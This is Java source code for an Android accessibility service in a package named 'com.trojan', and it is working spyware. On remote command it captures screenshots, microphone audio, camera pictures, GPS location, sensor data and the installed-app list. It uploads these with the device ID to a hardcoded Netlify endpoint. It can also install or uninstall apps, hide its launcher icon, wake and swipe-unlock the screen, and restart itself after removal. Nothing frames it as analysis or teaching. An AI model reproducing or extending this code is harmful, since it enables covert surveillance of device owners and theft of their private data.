package com.trojan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;

// All necessary imports are here. Removed incompatible ones.

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.List;

public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {

    private static final String TAG = "PowerAccessibility";

    // --- Action constants ---
    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.ACTION_GET_CURRENT_APP";
    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.ACTION_OPEN_APP";
    public static final String ACTION_TRIGGER_NAV_BACK = "com.trojan.ACTION_NAV_BACK";
    public static final String ACTION_TRIGGER_NAV_HOME = "com.trojan.ACTION_NAV_HOME";
    public static final String ACTION_TRIGGER_NAV_RECENTS = "com.trojan.ACTION_NAV_RECENTS";
    public static final String ACTION_TRIGGER_WAKE_DEVICE = "com.trojan.ACTION_WAKE_DEVICE";
    public static final String ACTION_TRIGGER_TOGGLE_WIFI = "com.trojan.ACTION_TOGGLE_WIFI";
    public static final String ACTION_TRIGGER_TOGGLE_BLUETOOTH = "com.trojan.ACTION_TOGGLE_BLUETOOTH";
    public static final String ACTION_TRIGGER_TOGGLE_LOCATION = "com.trojan.ACTION_TOGGLE_LOCATION";
    public static final String ACTION_TRIGGER_GET_LOCATION = "com.trojan.ACTION_GET_LOCATION";
    public static final String ACTION_TRIGGER_GET_SENSORS = "com.trojan.ACTION_GET_SENSORS";
    public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
    public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";
    public static final String ACTION_TAKE_SCREENSHOT = "com.trojan.ACTION_TAKE_SCREENSHOT";
    public static final String ACTION_TAKE_PICTURE = "com.trojan.ACTION_TAKE_PICTURE";
    public static final String ACTION_START_RECORDING = "com.trojan.ACTION_START_RECORDING";
    public static final String ACTION_STOP_RECORDING = "com.trojan.ACTION_STOP_RECORDING";
    public static final String ACTION_PLAY_SOUND = "com.trojan.ACTION_PLAY_SOUND";
    public static final String ACTION_SHOW_IMAGE = "com.trojan.ACTION_SHOW_IMAGE";
    public static final String ACTION_SET_VOLUME = "com.trojan.ACTION_SET_VOLUME";
    public static final String ACTION_INSTALL_APP = "com.trojan.ACTION_INSTALL_APP";
    public static final String ACTION_UNINSTALL_APP = "com.trojan.ACTION_UNINSTALL_APP";
    public static final String ACTION_TOGGLE_APP_ICON = "com.trojan.ACTION_TOGGLE_APP_ICON";

    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";

    private PowerActionReceiver powerActionReceiver;
    private RequestQueue requestQueue;
    private String lastForegroundAppPkg = "N/A";

    private FusedLocationProviderClient fusedLocationClient;
    private SensorManager sensorManager;
    private AudioManager audioManager;
    private MediaRecorder mediaRecorder;
    private String recordingFilePath;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "Accessibility Service Connected.");
        requestQueue = Volley.newRequestQueue(this);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        powerActionReceiver = new PowerActionReceiver();
        IntentFilter filter = new IntentFilter();
        // Add all actions
        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
        filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
        filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
        filter.addAction(ACTION_TRIGGER_NAV_HOME); filter.addAction(ACTION_TRIGGER_NAV_RECENTS);
        filter.addAction(ACTION_TRIGGER_WAKE_DEVICE); filter.addAction(ACTION_TRIGGER_TOGGLE_WIFI);
        filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH); filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
        filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
        filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);
        filter.addAction(ACTION_TAKE_SCREENSHOT); filter.addAction(ACTION_TAKE_PICTURE);
        filter.addAction(ACTION_START_RECORDING); filter.addAction(ACTION_STOP_RECORDING);
        filter.addAction(ACTION_PLAY_SOUND); filter.addAction(ACTION_SHOW_IMAGE);
        filter.addAction(ACTION_SET_VOLUME); filter.addAction(ACTION_INSTALL_APP);
        filter.addAction(ACTION_UNINSTALL_APP); filter.addAction(ACTION_TOGGLE_APP_ICON);
        registerReceiver(powerActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
    }

    private class PowerActionReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = (intent == null) ? null : intent.getAction();
            if (action == null) return;
            Log.i(TAG, "Command received: " + action);
            switch (action) {
                case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
                case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
                case ACTION_TRIGGER_NAV_HOME: performGlobalAction(GLOBAL_ACTION_HOME); break;
                case ACTION_TRIGGER_NAV_RECENTS: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
                case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
                case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
                case ACTION_TRIGGER_OPEN_APP: openApp(intent.getStringExtra("package_name")); break;
                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpAndSwipe(); break;
                case ACTION_TRIGGER_GET_SCREEN_STATUS: getScreenStatus(); break;
                case ACTION_TRIGGER_GET_BATTERY_STATUS: getBatteryStatus(); break;
                case ACTION_TRIGGER_TOGGLE_WIFI: openSettingsPanel(Settings.Panel.ACTION_WIFI); break;
                case ACTION_TRIGGER_TOGGLE_BLUETOOTH: openSettingsPanel(Settings.ACTION_BLUETOOTH_SETTINGS); break;
                case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
                case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
                case ACTION_TAKE_SCREENSHOT: 
                    captureScreenAndUpload(); // Call the new, compatible method
                    break;
                case ACTION_TAKE_PICTURE: takePicture(intent.getIntExtra("camera_id", 0)); break;
                case ACTION_START_RECORDING: startAudioRecording(); break;
                case ACTION_STOP_RECORDING: stopAudioRecording(); break;
                case ACTION_PLAY_SOUND: playSound(intent.getStringExtra("url")); break;
                case ACTION_SHOW_IMAGE: showImage(intent.getStringExtra("url")); break;
                case ACTION_SET_VOLUME: setVolume(intent.getIntExtra("level", -1)); break;
                case ACTION_INSTALL_APP: installApp(intent.getStringExtra("url")); break;
                case ACTION_UNINSTALL_APP: uninstallApp(intent.getStringExtra("package_name")); break;
                case ACTION_TOGGLE_APP_ICON: toggleAppIcon(intent.getBooleanExtra("show", false)); break;
            }
        }
    }
    
    // --- START OF RESTORED AND CORRECTED CODE ---
    
    @SuppressLint("WakelockTimeout")
    private void wakeUpAndSwipe() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
        wakeLock.acquire();
        wakeLock.release();
        Log.i(TAG, "Device screen woken up.");

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
            Path swipePath = new Path();
            swipePath.moveTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.8f);
            swipePath.lineTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.2f);
            GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400));
            dispatchGesture(gestureBuilder.build(), null, null);
        }, 500);
    }
    
    private void captureScreenAndUpload() {
        Log.d(TAG, "Attempting to capture screen using classic method.");
        new Handler(Looper.getMainLooper()).post(() -> {
            View rootView = null;
            try {
                rootView = getRootInActiveWindow();
                if (rootView == null) {
                    Log.e(TAG, "Root view is null. Cannot capture screen.");
                    submitDataToServer("screenshot_error", "Root view is null");
                    return;
                }
                rootView.setDrawingCacheEnabled(true);
                Bitmap bitmap = Bitmap.createBitmap(rootView.getDrawingCache());
                rootView.setDrawingCacheEnabled(false);
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream);
                byte[] byteArray = byteArrayOutputStream.toByteArray();
                String encodedString = Base64.encodeToString(byteArray, Base64.DEFAULT);
                uploadBase64File("screenshot", encodedString);
                Log.i(TAG, "Screen captured and sent for upload.");
            } catch (Exception e) {
                Log.e(TAG, "Failed to capture or process screen.", e);
                submitDataToServer("screenshot_error", "Failed to capture screen: " + e.getMessage());
            } finally {
                if (rootView != null) {
                    rootView.setDrawingCacheEnabled(false);
                }
            }
        });
    }

    private void takePicture(int cameraId) {
        Log.i(TAG, "Requesting picture from camera ID: " + cameraId);
        Intent intent = new Intent(this, CameraActivity.class);
        intent.putExtra("camera_id", cameraId);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void startAudioRecording() {
        if (mediaRecorder != null) { return; }
        try {
            File outputDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            File outputFile = File.createTempFile("recording", ".mp3", outputDir);
            recordingFilePath = outputFile.getAbsolutePath();
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(recordingFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            Log.i(TAG, "Audio recording started.");
        } catch (IOException e) {
            Log.e(TAG, "Failed to start audio recording.", e);
            mediaRecorder = null;
        }
    }

    private void stopAudioRecording() {
        if (mediaRecorder == null) { return; }
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            Log.i(TAG, "Audio recording stopped.");
            File audioFile = new File(recordingFilePath);
            if (audioFile.exists()) {
                try {
                    java.io.InputStream inputStream = new java.io.FileInputStream(audioFile);
                    byte[] audioBytes = new byte[(int) audioFile.length()];
                    inputStream.read(audioBytes);
                    inputStream.close();
                    String encodedAudio = Base64.encodeToString(audioBytes, Base64.DEFAULT);
                    uploadBase64File("last_recording", encodedAudio);
                    audioFile.delete();
                } catch (Exception e) {
                    Log.e(TAG, "Failed to encode and upload audio file.", e);
                }
            }
        } catch (RuntimeException e) {
            Log.e(TAG, "Failed to stop recording properly.", e);
            mediaRecorder = null;
        }
    }

    private void uploadBase64File(String dataType, String base64Data) {
        String url = "https://trojanadmin.netlify.app/.netlify/functions/upload-file";
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create file upload JSON", e);
            return;
        }
        Log.d(TAG, "Uploading Base64 data for type: " + dataType);
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, postData,
            response -> Log.i(TAG, "Base64 data submitted successfully: " + dataType),
            error -> Log.e(TAG, "Failed to submit Base64 data '" + dataType + "': " + error.toString())
        );
        request.setRetryPolicy(new com.android.volley.DefaultRetryPolicy(
                30000, 1, 1.0f));
        requestQueue.add(request);
    }
    
    private void playSound(String url) {
        if (url == null || url.isEmpty()) return;
        MediaPlayer mediaPlayer = new MediaPlayer();
        try {
            mediaPlayer.setDataSource(url);
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(MediaPlayer::start);
            mediaPlayer.setOnCompletionListener(mp -> {
                mp.stop();
                mp.release();
            });
        } catch (IOException e) { Log.e(TAG, "Failed to play sound.", e); }
    }

    private void showImage(String url) {
        if (url == null || url.isEmpty()) return;
        Intent intent = new Intent(this, ImageDisplayActivity.class);
        intent.putExtra("image_url", url);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void setVolume(int level) {
        if (level < 0 || level > 100 || audioManager == null) return;
        int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        int targetVolume = (int) (maxVolume * (level / 100.0f));
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0);
    }

    private void installApp(String url) {
        if (url == null || url.isEmpty()) return;
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void uninstallApp(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void toggleAppIcon(boolean show) {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
    }

    private void getAndUploadAppList() {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONObject appMap = new JSONObject();
            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appMap.put(app.packageName, app.loadLabel(pm).toString());
                }
            }
            submitDataToServer("installed_apps", appMap);
        } catch (Exception e) { Log.e(TAG, "Failed to get app list.", e); }
    }

    @SuppressLint("MissingPermission")
    private void getCurrentLocation() {
        try {
            fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                try {
                    if (location != null) {
                        JSONObject locJson = new JSONObject();
                        locJson.put("latitude", location.getLatitude());
                        locJson.put("longitude", location.getLongitude());
                        submitDataToServer("location", locJson);
                    } else {
                        submitDataToServer("location", "Not available");
                    }
                } catch (JSONException e) { Log.e(TAG, "Error creating location JSON.", e); }
            });
        } catch (SecurityException e) { Log.e(TAG, "Location permission not granted by user.", e); }
    }

    private void getSensorData() {
        registerSensorIfAvailable(Sensor.TYPE_ROTATION_VECTOR, "rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GAME_ROTATION_VECTOR, "game_rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR, "geomagnetic_rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GRAVITY, "gravity");
        registerSensorIfAvailable(Sensor.TYPE_ACCELEROMETER, "accelerometer");
        registerSensorIfAvailable(Sensor.TYPE_GYROSCOPE, "gyroscope");
        registerSensorIfAvailable(Sensor.TYPE_MAGNETIC_FIELD, "magnetometer");
        registerSensorIfAvailable(Sensor.TYPE_PROXIMITY, "proximity");
        registerSensorIfAvailable(Sensor.TYPE_LIGHT, "light");
        registerSensorIfAvailable(Sensor.TYPE_PRESSURE, "pressure");
    }

    private void registerSensorIfAvailable(int sensorType, String dataType) {
        try {
            if (sensorManager == null) return;
            Sensor sensor = sensorManager.getDefaultSensor(sensorType);
            if (sensor != null) {
                sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL);
            } else {
                submitDataToServer(dataType, "Not available");
            }
        } catch (Exception e) { Log.e(TAG, "Exception while registering sensor: " + dataType, e); }
    }

    @Override
    public final void onSensorChanged(SensorEvent event) {
        JSONObject sensorData = new JSONObject();
        String sensorTypeKey = "";
        try {
            int type = event.sensor.getType();
            if (type == Sensor.TYPE_ROTATION_VECTOR || type == Sensor.TYPE_GAME_ROTATION_VECTOR || type == Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR) {
                if (type == Sensor.TYPE_ROTATION_VECTOR) sensorTypeKey = "rotation_vector";
                else if (type == Sensor.TYPE_GAME_ROTATION_VECTOR) sensorTypeKey = "game_rotation_vector";
                else sensorTypeKey = "geomagnetic_rotation_vector";
                sensorData.put("x", event.values[0]); sensorData.put("y", event.values[1]); sensorData.put("z", event.values[2]);
                if (event.values.length > 3) sensorData.put("w", event.values[3]);
            } else if (type == Sensor.TYPE_GRAVITY || type == Sensor.TYPE_ACCELEROMETER || type == Sensor.TYPE_GYROSCOPE || type == Sensor.TYPE_MAGNETIC_FIELD) {
                if (type == Sensor.TYPE_GRAVITY) sensorTypeKey = "gravity";
                else if (type == Sensor.TYPE_ACCELEROMETER) sensorTypeKey = "accelerometer";
                else if (type == Sensor.TYPE_GYROSCOPE) sensorTypeKey = "gyroscope";
                else sensorTypeKey = "magnetometer";
                sensorData.put("x", event.values[0]); sensorData.put("y", event.values[1]); sensorData.put("z", event.values[2]);
            } else if (type == Sensor.TYPE_PROXIMITY) {
                sensorTypeKey = "proximity"; sensorData.put("distance", event.values[0]);
            } else if (type == Sensor.TYPE_LIGHT) {
                sensorTypeKey = "light"; sensorData.put("lux", event.values[0]);
            } else if (type == Sensor.TYPE_PRESSURE) {
                sensorTypeKey = "pressure"; sensorData.put("pressure", event.values[0]);
            }
            if (!sensorTypeKey.isEmpty()) {
                submitDataToServer(sensorTypeKey, sensorData);
            }
        } catch (JSONException e) { Log.e(TAG, "JSON error.", e); }
        finally { sensorManager.unregisterListener(this, event.sensor); }
    }

    private void submitDataToServer(String dataType, Object payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
        } catch (JSONException e) { return; }
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData, r -> {}, e -> {});
        requestQueue.add(request);
    }

    private void getBatteryStatus() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);
        try {
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                float pct = (level == -1 || scale == -1) ? -1f : level * 100 / (float) scale;
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
                JSONObject json = new JSONObject();
                json.put("percentage", pct);
                json.put("isCharging", isCharging);
                submitDataToServer("battery_status", json);
            }
        } catch (JSONException e) { Log.e(TAG, "Error creating battery JSON."); }
    }

    private void getScreenStatus() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off");
    }

    private void openSettingsPanel(String settingsAction) {
        startActivity(new Intent(settingsAction).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    private void openApp(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launchIntent);
        }
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {}

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            lastForegroundAppPkg = event.getPackageName().toString();
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public boolean onUnbind(Intent intent) {
        if (powerActionReceiver != null) unregisterReceiver(powerActionReceiver);
        if (sensorManager != null) sensorManager.unregisterListener(this);
        return super.onUnbind(intent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        PendingIntent restartServicePendingIntent = PendingIntent.getService(
                getApplicationContext(), 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
        super.onTaskRemoved(rootIntent);
    }
}